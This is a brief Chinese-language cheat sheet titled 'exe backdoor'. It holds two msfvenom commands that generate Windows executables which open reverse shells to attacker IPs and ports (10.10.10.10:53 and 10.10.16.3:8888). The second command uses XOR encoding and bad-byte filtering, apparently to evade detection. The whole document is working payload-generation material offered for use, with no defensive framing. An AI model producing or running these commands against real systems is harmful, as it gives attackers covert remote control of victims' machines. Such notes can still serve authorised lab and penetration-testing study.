# exe后门

1. 普通（也能用）

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

1. 修改版

```bash
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.16.3 LPORT=8888 -a x64 --platform windows -e x64/xor_dynamic -b '\x00' -f exe -o shell.exe
```

‍
